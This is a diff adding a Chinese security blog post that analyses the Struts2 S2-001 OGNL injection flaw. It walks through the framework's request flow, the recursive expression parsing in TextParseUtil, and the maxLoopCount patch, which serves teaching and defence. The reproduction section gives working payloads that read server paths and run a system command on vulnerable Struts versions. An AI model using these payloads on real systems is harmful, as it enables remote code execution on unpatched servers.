@@ -1,0 +1,530 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Java Web安全入门——S2-001漏洞分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Java Web安全入门——S2-001漏洞分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-10-29 21:48" pubdate>
+        2019年10月29日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java Web安全入门——S2-001漏洞分析</h1>
+            
+            <div class="markdown-body">
+              <p>Java-Web入门第一篇，S2-001漏洞复现&amp;原理分析</p>
+<a id="more"></a>
+
+<h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>官方公告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
+<p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p>
+<h2 id="2-Struts2-架构-amp-请求处理流程"><a href="#2-Struts2-架构-amp-请求处理流程" class="headerlink" title="2. Struts2 架构&amp;请求处理流程"></a>2. Struts2 架构&amp;请求处理流程</h2><p><img src="https://image.mengsec.com/struts/s2001/Struts2-Architecture.png" srcset="/img/loading.gif" alt="Struts2-Architecture"></p>
+<p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p>
+<ul>
+<li>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</li>
+<li>Struts Core(浅蓝色)：Struts2的核心部分。</li>
+<li>Interceptors(浅绿色)：Struts2的拦截器。</li>
+<li>User created(浅黄色)：需要开发人员创建的部分。</li>
+</ul>
+<p>图中的一些组件的作用如下：</p>
+<ul>
+<li><strong>FilterDispatcher</strong>：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</li>
+<li><strong>ActionMapper</strong>：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</li>
+<li><strong>ActionProxy</strong>：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</li>
+<li><strong>ConfigurationManager</strong>：是xwork配置的管理中心，可以把它当做已经读取到内存中的<code>struts.xml</code>配置文件。</li>
+<li><strong>struts.xml</strong>：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</li>
+<li><strong>ActionInvocation</strong>：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</li>
+<li><strong>Interceptor</strong>：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</li>
+<li><strong>Action</strong>：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</li>
+<li><strong>Result</strong>：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</li>
+<li><strong>Templates</strong>：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</li>
+<li><strong>Tag Subsystem</strong>：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</li>
+</ul>
+<p>接下来我们可以结合上图，来了解下Struts2框架是如何处理一个HTTP请求的。</p>
+<p>当HTTP请求发送个Web服务器之后，Web服务器根据用户的请求以及<code>web.xml</code>中的配置文件，将请求转发给<code>Struts2</code>框架进行处理。</p>
+<ol>
+<li>HTTP请求经过一系列的过滤器，最后到达<code>FilterDispatcher</code>过滤器。</li>
+<li><code>FilterDispatcher</code>将请求转发给<code>ActionMapper</code>，判断该请求是否需要处理。</li>
+<li>如果该请求需要处理，<code>FilterDispatcher</code>会创建一个<code>ActionProxy</code>来进行后续的处理。</li>
+<li><code>ActionProxy</code>拿着HTTP请求，询问<code>struts.xml</code>该调用哪一个<code>Action</code>进行处理。</li>
+<li>当知道目标<code>Action</code>之后，实例化一个<code>ActionInvocation</code>来进行调用。</li>
+<li>然后运行在<code>Action</code>之前的拦截器，图中就是拦截器1、2、3。</li>
+<li>运行<code>Action</code>，生成一个<code>Result</code>。</li>
+<li><code>Result</code>根据页面模板和标签库，生成要响应的内容。</li>
+<li>根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。</li>
+</ol>
+<h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><p>常用Payload</p>
+<p>获取tomcat路径</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">%&#123;<span class="hljs-string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="hljs-meta">@java</span>.lang.System<span class="hljs-meta">@getProperty</span>(<span class="hljs-string">&quot;user.dir&quot;</span>)+<span class="hljs-string">&quot;&#125;&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029192106225.png" srcset="/img/loading.gif" alt="image-20191029192106225"></p>
+<p>获取Web路径</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="hljs-string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029193405016.png" srcset="/img/loading.gif" alt="image-20191029193405016"></p>
+<p>执行命令</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">%&#123;#a=(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.String[]&#123;<span class="hljs-string">&quot;id&quot;</span>&#125;)</span>).redirect<span class="hljs-constructor">ErrorStream(<span class="hljs-params">true</span>)</span>.start<span class="hljs-literal">()</span>,#b=#a.get<span class="hljs-constructor">InputStream()</span>,#c=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">InputStreamReader(#<span class="hljs-params">b</span>)</span>,#d=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">BufferedReader(#<span class="hljs-params">c</span>)</span>,#e=<span class="hljs-keyword">new</span> <span class="hljs-built_in">char</span><span class="hljs-literal">[<span class="hljs-number">50000</span>]</span>,#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.get<span class="hljs-constructor">Writer()</span>.println(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">String(#<span class="hljs-params">e</span>)</span>),#f.get<span class="hljs-constructor">Writer()</span>.flush<span class="hljs-literal">()</span>,#f.get<span class="hljs-constructor">Writer()</span>.close<span class="hljs-literal">()</span>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029193509211.png" srcset="/img/loading.gif" alt="image-20191029193509211"></p>
+<h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4. 漏洞分析"></a>4. 漏洞分析</h2><p>我们就以<code>%&#123;1+1&#125;</code>作为Payload，来分析一下漏洞产生的原因。</p>
+<p>首先给我们自定义的Action上下一个断点，然后发送一个请求。</p>
+<p>从调用栈中，我们可以知道，在<code>DefaultActionInvocation</code>类中反射调用了我们自定义的类<code>LoginAction</code>。</p>
+<p>路径：<code>xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/DefaultActionInvocation.java</code></p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029201816282.png" srcset="/img/loading.gif" alt="image-20191029201816282"></p>
+<p>此时到达自定义类<code>LoginAction</code>的<code>username</code>的值为<code>%&#123;1+1&#125;</code>。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029202015653.png" srcset="/img/loading.gif" alt="image-20191029202015653"></p>
+<p>从官方公布的漏洞详情中，我们可以知道，漏洞是出现在Struts2重新渲染jsp时，对ognl表达式进行了递归解析，导致了恶意的表达式被执行。</p>
+<p>让我们继续往下跟，直到进入了<code>TextParseUtil</code>中。</p>
+<p>路径：<code>xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/util/TextParseUtil.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">translateVariables</span><span class="hljs-params">(<span class="hljs-keyword">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator)</span> </span>&#123;<br>    <span class="hljs-comment">// deal with the &quot;pure&quot; expressions first!</span><br>    <span class="hljs-comment">//expression = expression.trim();</span><br>    Object result = expression;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>        <span class="hljs-keyword">int</span> start = expression.indexOf(open + <span class="hljs-string">&quot;&#123;&quot;</span>);<br>        <span class="hljs-keyword">int</span> length = expression.length();<br>        <span class="hljs-keyword">int</span> x = start + <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">int</span> end;<br>        <span class="hljs-keyword">char</span> c;<br>        <span class="hljs-keyword">int</span> count = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (start != -<span class="hljs-number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="hljs-number">0</span>) &#123;<br>            c = expression.charAt(x++);<br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>                count++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>                count--;<br>            &#125;<br>        &#125;<br>        end = x - <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">if</span> ((start != -<span class="hljs-number">1</span>) &amp;&amp; (end != -<span class="hljs-number">1</span>) &amp;&amp; (count == <span class="hljs-number">0</span>)) &#123;<br>            String <span class="hljs-keyword">var</span> = expression.substring(start + <span class="hljs-number">2</span>, end);<br><br>            Object o = stack.findValue(<span class="hljs-keyword">var</span>, asType);<br>            <span class="hljs-keyword">if</span> (evaluator != <span class="hljs-keyword">null</span>) &#123;<br>                o = evaluator.evaluate(o);<br>            &#125;<br>            <br><br>            String left = expression.substring(<span class="hljs-number">0</span>, start);<br>            String right = expression.substring(end + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (o != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (TextUtils.stringSet(left)) &#123;<br>                    result = left + o;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result = o;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (TextUtils.stringSet(right)) &#123;<br>                    result = result + right;<br>                &#125;<br><br>                expression = left + o + right;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// the variable doesn&#x27;t exist, so don&#x27;t display anything</span><br>                result = left + right;<br>                expression = left + right;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在这里下了断点之后，程序进入了该方法好几次，而且每次的<code>expression</code>的值也不一样。</p>
+<p>在手册中，我们也可以查到该方法的作用是将变量转换为对象。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029204849689.png" srcset="/img/loading.gif" alt="image-20191029204849689"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://struts.apache.org/maven/struts2-core/apidocs/index.html">https://struts.apache.org/maven/struts2-core/apidocs/index.html</a></p>
+</blockquote>
+<p>当<code>expression</code>为<code>username</code>时，从调用栈中我们可以看到整个调用过程。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029205431561.png" srcset="/img/loading.gif" alt="image-20191029205431561"></p>
+<p>读取<code>index.jsp</code>的标签</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029205615826.png" srcset="/img/loading.gif" alt="image-20191029205615826"></p>
+<p>通过<code>UIBean</code>将标签解析出来</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029205825958.png" srcset="/img/loading.gif" alt="image-20191029205825958"></p>
+<p>然后将其传入到了<code>translateVariables</code>方法中。</p>
+<p>经过两次调用之后，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);<br></code></pre></td></tr></table></figure>
+<p>传入的<code>expression</code>的值变为了<code>%&#123;username&#125;</code>。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029210131255.png" srcset="/img/loading.gif" alt="image-20191029210131255"></p>
+<p>在后面的<code>findValue</code>方法中获得了我们传入的Payload<code>%&#123;1+1&#125;</code>，然后将其存入到了<code>o</code>中。</p>
+<p>继续往下走，<code>%&#123;1+1&#125;</code>还是满足ognl表达式的规则，于是又进行了一次调用。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029210311489.png" srcset="/img/loading.gif" alt="image-20191029210311489"></p>
+<p>此时的<code>expression</code>的值为<code>%&#123;1+1&#125;</code>，在后面使用<code>findValue</code>对表达式进行了解析，返回的值<code>2</code>。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029210808496.png" srcset="/img/loading.gif" alt="image-20191029210808496"></p>
+<p>在这之后，<code>2</code>这个值是不满足表达式的规则，于是直接将值进行了返回。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029210948730.png" srcset="/img/loading.gif" alt="image-20191029210948730"></p>
+<p>由于没有进行验证，导致我们的输入<code>%&#123;1+1&#125;</code>被程序错误的当做了表达式进行了解析，返回了值<code>2</code>，最终显示在响应的表单中。</p>
+<h2 id="5-补丁分析"><a href="#5-补丁分析" class="headerlink" title="5. 补丁分析"></a>5. 补丁分析</h2><p>通过对比xwork2.0.3和2.0.4版本的源码，我们很容易可以发现区别。</p>
+<p><img src="https://image.mengsec.com/struts/s2001/image-20191029213426397.png" srcset="/img/loading.gif" alt="image-20191029213426397"></p>
+<p>添加了一个<code>maxLoopCount</code>属性，限制了递归解析的最大数目。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (loopCount &gt; maxLoopCount) &#123;<br>    <span class="hljs-comment">// translateVariables prevent infinite loop / expression recursive evaluation</span><br>    <span class="hljs-keyword">break</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>从而在解析到<code>%&#123;1+1&#125;</code>时，不会继续向下递归了，这样就修复了该漏洞。</p>
+<h2 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6. Reference"></a>6. Reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/">https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/</a></li>
+<li><a target="_blank" rel="noopener" href="https://chybeta.github.io/2018/02/06/[struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97]S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></li>
+<li><a target="_blank" rel="noopener" href="https://seaii-blog.com/index.php/2019/09/20/90.html">https://seaii-blog.com/index.php/2019/09/20/90.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://struts.apache.org/core-developers/big-picture">https://struts.apache.org/core-developers/big-picture</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Java-Web/">Java-Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/10/29/Java-Web-Struts2-Env-Build/">
+                        <span class="hidden-mobile">Java Web安全入门——S2漏洞测试环境搭建</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
